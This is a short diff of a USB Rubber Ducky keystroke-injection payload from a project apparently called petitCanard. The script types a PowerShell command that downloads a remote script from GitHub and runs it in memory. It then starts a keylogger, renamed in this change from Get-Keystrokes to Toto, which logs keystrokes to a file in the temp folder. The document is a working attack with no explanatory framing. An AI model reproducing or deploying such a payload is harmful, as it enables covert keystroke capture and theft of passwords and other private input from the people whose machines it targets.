@@ -7,7 +7,7 @@ DELAY 1500
 STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HE-Arc/petitCanard/master/powershell_scripts/Toto.ps1')
 ENTER
 DELAY 400
-STRING Get-Keystrokes -LogPath $env:temp\key.log
+STRING Toto -LogPath $env:temp\key.log
 ENTER
 DELAY 200
 GUI r
